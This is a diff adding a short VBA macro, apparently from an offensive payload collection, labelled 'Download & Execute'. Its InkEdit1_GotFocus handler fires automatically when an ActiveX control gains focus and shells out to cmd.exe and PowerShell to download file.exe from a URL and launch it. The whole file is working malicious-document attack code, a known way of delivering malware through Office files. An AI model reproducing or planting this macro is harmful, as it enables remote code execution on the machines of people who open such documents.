@@ -1,0 +1,6 @@
+' Download & Execute 
+' Using ActiveX controls for macro execution to download file.exe from a website & exeecute file.exe
+
+Sub InkEdit1_GotFocus()
+Run = Shell("cmd.exe /c PowerShell (New-Object System.Net.WebClient).DownloadFile('https://trusted.domain/file.exe',‘file.exe');Start-Process ‘file.exe'", vbNormalFocus)
+End Sub
